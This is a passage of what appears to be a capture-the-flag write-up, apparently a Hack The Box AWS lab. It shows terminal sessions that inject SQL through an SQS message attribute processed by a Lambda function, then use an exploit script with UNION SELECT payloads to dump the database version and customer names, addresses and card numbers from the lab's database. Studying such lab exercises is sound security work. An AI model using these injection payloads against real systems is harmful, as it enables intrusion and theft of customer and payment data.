+└─$ aws sqs send-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics --message-attributes '{ "Weight": { "StringValue": "1337", "DataType":"Number"}, "Client": {"StringValue":"idontexist", "DataType": "String"}, "trackingID": {"StringValue":"HLT1337", "DataType":"String"}}' --message-body "Testing"
+{
+    "MD5OfMessageBody": "fa6a5a3224d7da66d9e0bdec25f62cf0",
+    "MD5OfMessageAttributes": "a7a15567ca78a433555e2c56733bf18b",
+    "MessageId": "ed64479b-f7d2-490d-aea2-e8b29ba365fd"
+}
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws lambda invoke --function-name huge-logistics-stock --payload "{\"DESC\":\"HLT1337\"}" output && cat output
+{
+    "StatusCode": 200,
+    "ExecutedVersion": "$LATEST"
+}
+[]
+```
 
+Note how sending an extra double quotes character in the client name breaks the DB. SQL injection!
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws sqs send-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics --message-attributes '{ "Weight": { "StringValue": "1337", "DataType":"Number"}, "Client": {"StringValue":"idontexist\"", "DataType": "String"}, "trackingID": {"StringValue":"HLT1337", "DataType":"String"}}' --message-body "Testing"
+{
+    "MD5OfMessageBody": "fa6a5a3224d7da66d9e0bdec25f62cf0",
+    "MD5OfMessageAttributes": "478444444b20a98a6f3bb11ad3010382",
+    "MessageId": "414139af-87fe-4db7-9643-38514232d065"
+}
 
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws lambda invoke --function-name huge-logistics-stock --payload "{\"DESC\":\"HLT1337\"}" output && cat output
+{
+    "StatusCode": 200,
+    "ExecutedVersion": "$LATEST"
+}
+"DB error" 
+```
 
+With a script that builds the command with an injected payload passed as a parameter, keep enumerating the DB
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ./exploit.sh "UNION SELECT null, null, null, @@version;-- -"                        
+[{"trackingID": "HLT1356", "clientName": "VELUS CORP.", "packageWeight": 75, "delivered": "0"}, {"trackingID": "HLT1378", "clientName": "VELUS CORP.", "packageWeight": 80, "delivered": "0"}, {"trackingID": "HLT4080", "clientName": "VELUS CORP.", "packageWeight": 9525, "delivered": "0"}, {"trackingID": null, "clientName": null, "packageWeight": null, "delivered": "8.0.42"}]
 
+<snip>
 
-
-
-
-
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ./exploit.sh "UNION SELECT null, null, null, CONCAT(clientName,':',address,':',cardUsed) FROM customerData-- -"                
+Adidas:56 Claremont Court:5133110655169130
+EY:3 Farmco Parkway:4913444258211042
+Google Inc.:559 Ohio Lane:3532085972424818
+VELUS CORP.:e46fbfe64cf7e50be097005f2de8b227:3558615975963377
+```
 
 <br>
-
 
 ## HTB Fortress: AWS
 
